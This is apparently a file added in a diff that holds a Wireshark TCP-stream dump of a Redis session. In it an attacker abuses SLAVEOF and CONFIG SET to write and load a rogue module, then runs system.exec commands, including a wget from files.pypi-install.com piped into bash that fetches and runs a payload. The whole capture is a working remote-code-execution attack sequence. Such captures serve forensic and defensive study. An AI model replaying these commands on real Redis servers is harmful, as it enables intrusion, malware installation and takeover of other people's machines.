@@ -1,0 +1,140 @@
+
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 2
+Node 0: 10.10.0.15:34730
+Node 1: 10.10.0.90:6379
+31
+*2
+$4
+AUTH
+$10
+1943567864
+
+	5
++OK
+
+44
+*3
+$7
+SLAVEOF
+$10
+10.10.0.15
+$4
+6379
+
+	5
++OK
+
+45
+*4
+$6
+CONFIG
+$3
+SET
+$3
+DIR
+$5
+/data
+
+	5
++OK
+
+60
+*4
+$6
+CONFIG
+$3
+SET
+$10
+dbfilename
+$11
+x10SPFHN.so
+
+	5
++OK
+
+46
+*3
+$6
+MODULE
+$4
+LOAD
+$13
+./x10SPFHN.so
+
+	5
++OK
+
+34
+*3
+$7
+SLAVEOF
+$2
+NO
+$3
+ONE
+
+	5
++OK
+
+56
+*4
+$6
+CONFIG
+$3
+SET
+$10
+dbfilename
+$8
+dump.rdb
+
+	5
++OK
+
+48
+*2
+$11
+system.exec
+$19
+rm -v ./x10SPFHN.so
+
+	71
+$64
+adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f
+
+36
+*2
+$11
+system.exec
+$8
+uname -a
+
+	232
+$224
+a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3
+
+143
+*2
+$11
+system.exec
+$113
+wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
+
+	968
+$960
+394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
+
+40
+*3
+$6
+MODULE
+$6
+UNLOAD
+$6
+system
+
+	5
++OK
+
+===================================================================
